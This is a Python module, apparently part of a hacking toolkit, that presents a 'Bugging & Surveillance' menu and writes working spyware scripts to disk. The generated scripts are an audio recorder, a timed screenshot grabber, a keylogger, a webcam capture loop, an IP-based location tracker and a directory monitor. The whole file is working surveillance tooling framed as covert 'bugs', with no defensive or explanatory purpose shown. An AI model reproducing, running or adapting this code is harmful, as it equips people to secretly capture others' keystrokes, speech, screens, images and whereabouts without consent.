#!/usr/bin/env python3
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "core"))
from auth import auth_required
from utils import log_action

@auth_required
def run_bug():
    print("""
    ╔═══════════════════════════════════════════════════════╗
    ║         BUGGING & SURVEILLANCE MODULE                 ║
    ╚═══════════════════════════════════════════════════════╝
    """)
    print("[1] Audio Recorder")
    print("[2] Screenshot Surveillance")
    print("[3] Keylogger")
    print("[4] Camera Access")
    print("[5] GPS Tracker")
    print("[6] File Monitor")
    choice = input("\n[BUG] Select: ").strip()
    if choice == "1":
        dur = int(input("[BUG] Duration seconds (default 300): ").strip() or "300")
        lines = [
            "import sounddevice as sd,wavio,time,os",
            "os.makedirs('bug_audio',exist_ok=True)",
            "fs=44100",
            "rec=sd.rec(int(" + str(dur) + "*fs),samplerate=fs,channels=2,dtype='int16')",
            "sd.wait()",
            "wavio.write('bug_audio/rec_'+str(int(time.time()))+'.wav',rec,fs,sampwidth=2)"
        ]
        with open("audio_bug.py", "w") as f:
            f.write("\n".join(lines))
        print("[BUG] Audio bug saved. pip install sounddevice wavio")
        log_action("BUG", "Audio recorder")
    elif choice == "2":
        iv = int(input("[BUG] Interval seconds (default 30): ").strip() or "30")
        dur = int(input("[BUG] Duration minutes (default 60): ").strip() or "60")
        lines = [
            "import pyautogui,time,os",
            "os.makedirs('bug_screenshots',exist_ok=True)",
            "end=time.time()+(" + str(dur) + "*60)",
            "while time.time()<end:",
            "    pyautogui.screenshot().save('bug_screenshots/screen_'+str(int(time.time()))+'.png')",
            "    time.sleep(" + str(iv) + ")"
        ]
        with open("screenshot_bug.py", "w") as f:
            f.write("\n".join(lines))
        print("[BUG] Screenshot bug saved. pip install pyautogui")
        log_action("BUG", "Screenshot surveillance")
    elif choice == "3":
        lines = [
            "from pynput import keyboard",
            "import logging,os",
            "os.makedirs('bug_logs',exist_ok=True)",
            "logging.basicConfig(filename='bug_logs/keys.log',level=logging.DEBUG,format='%(asctime)s: %(message)s')",
            "def on_press(key):",
            "    try: logging.info(key.char)",
            "    except: logging.info(str(key))",
            "with keyboard.Listener(on_press=on_press) as l: l.join()"
        ]
        with open("keylogger_bug.py", "w") as f:
            f.write("\n".join(lines))
        print("[BUG] Keylogger saved. pip install pynput")
        log_action("BUG", "Keylogger")
    elif choice == "4":
        lines = [
            "import cv2,time,os",
            "os.makedirs('bug_camera',exist_ok=True)",
            "cap=cv2.VideoCapture(0)",
            "while True:",
            "    ret,frame=cap.read()",
            "    if ret: cv2.imwrite('bug_camera/cam_'+str(int(time.time()))+'.jpg',frame)",
            "    time.sleep(5)"
        ]
        with open("camera_bug.py", "w") as f:
            f.write("\n".join(lines))
        print("[BUG] Camera bug saved. pip install opencv-python")
        log_action("BUG", "Camera surveillance")
    elif choice == "5":
        lines = [
            "import urllib.request,time,json",
            "while True:",
            "    try:",
            "        req=urllib.request.Request('http://ip-api.com/json/',headers={'User-Agent':'Mozilla/5.0'})",
            "        resp=urllib.request.urlopen(req,timeout=10)",
            "        data=json.loads(resp.read().decode())",
            "        loc={'lat':data.get('lat'),'lon':data.get('lon'),'city':data.get('city'),'time':time.time()}",
            "        with open('bug_gps.log','a') as f: f.write(json.dumps(loc)+'\n')",
            "    except Exception as e: print('Error:',e)",
            "    time.sleep(60)"
        ]
        with open("gps_bug.py", "w") as f:
            f.write("\n".join(lines))
        print("[BUG] GPS tracker saved.")
        log_action("BUG", "GPS tracker")
    elif choice == "6":
        path = input("[BUG] Directory to monitor: ").strip() or "/sdcard/"
        lines = [
            "import os,time",
            "path=" + repr(path),
            "before=dict([(f,os.path.getmtime(os.path.join(path,f))) for f in os.listdir(path)])",
            "while True:",
            "    time.sleep(5)",
            "    after=dict([(f,os.path.getmtime(os.path.join(path,f))) for f in os.listdir(path)])",
            "    added=[f for f in after if f not in before]",
            "    removed=[f for f in before if f not in after]",
            "    modified=[f for f in after if f in before and after[f]!=before[f]]",
            "    if added: print('ADDED:',added)",
            "    if removed: print('REMOVED:',removed)",
            "    if modified: print('MODIFIED:',modified)",
            "    before=after"
        ]
        with open("file_monitor.py", "w") as f:
            f.write("\n".join(lines))
        print("[BUG] File monitor saved.")
        log_action("BUG", "File monitor on " + path)
